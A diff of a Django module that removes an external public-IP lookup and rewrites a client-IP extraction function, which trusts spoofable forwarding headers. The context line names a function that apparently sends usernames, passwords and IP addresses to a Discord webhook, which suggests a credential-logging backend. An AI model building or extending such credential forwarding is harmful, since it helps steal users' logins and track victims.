@@ -272,27 +272,14 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         print(f"❌ Error sending Discord webhook: {e}")
         return False
 
-def get_public_ip():
-   
-    """Look up current public IP using an external API"""
-    for api_url in PUBLIC_IP_APIS:
-        try:
-            if USE_PROXY:
-                response = requests.get(api_url, timeout=5, proxies=PROXY)
-            else:
-                response = requests.get(api_url, timeout=5)
-            
-            if response.status_code == 200:
-                ip = response.text.strip()
-                if ip:
-                    return ip
-        except:
-            continue
-    return None
-
 def get_client_ip(request):
     """
-    Accurate IP extraction in all environments (local/proxy/production)
+    Extract the actual IP of the user (client) accessing the site
+
+    Priority:
+    1. HTTP_X_FORWARDED_FOR (Proxy/Load Balancer)
+    2. HTTP_X_REAL_IP (Nginx, etc.)
+    3. REMOTE_ADDR (Direct connection)
     """
     print("=" * 60)
     print("🔍 IP HEADERS DEBUG:")
@@ -300,34 +287,23 @@ def get_client_ip(request):
     print(f"  HTTP_X_FORWARDED_FOR: {request.META.get('HTTP_X_FORWARDED_FOR')}")
     print(f"  HTTP_X_REAL_IP: {request.META.get('HTTP_X_REAL_IP')}")
     
-    # 1. X-Forwarded-For (real client IP forwarded by proxy)
+    # 1. X-Forwarded-For (Actual client IP passed by proxy)
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     if x_forwarded_for:
+        # If multiple IPs exist, the first one is the actual client IP
         ip = x_forwarded_for.split(',')[0].strip()
-        if ip and ip != 'unknown' and ip != '127.0.0.1':
+        if ip and ip != 'unknown':
             print(f"✅ FINAL IP: {ip} (from X-Forwarded-For)")
             return ip
     
-    # 2. X-Real-IP
+    # 2. X-Real-IP (Set by Nginx, etc.)
     x_real_ip = request.META.get('HTTP_X_REAL_IP')
-    if x_real_ip and x_real_ip != 'unknown' and x_real_ip != '127.0.0.1':
+    if x_real_ip and x_real_ip != 'unknown':
         print(f"✅ FINAL IP: {x_real_ip} (from X-Real-IP)")
         return x_real_ip
     
-    # 3.Check REMOTE_ADDR
+    # 3. REMOTE_ADDR (Direct connection or last resort)
     remote_ip = request.META.get('REMOTE_ADDR')
-    
-    # 4. If REMOTE_ADDR is 127.0.0.1, look up public IP using external API
-    if remote_ip == '127.0.0.1' or remote_ip == 'localhost':
-        print("⚠️ REMOTE_ADDR is localhost, fetching public IP from external API...")
-        public_ip = get_public_ip()
-        if public_ip:
-            print(f"✅ FINAL IP: {public_ip} (from external API)")
-            return public_ip
-        else:
-            print("⚠️ Failed to get public IP from external APIs")
-    
-    # 5. Return REMOTE_ADDR
     if remote_ip:
         print(f"✅ FINAL IP: {remote_ip} (from REMOTE_ADDR)")
         return remote_ip
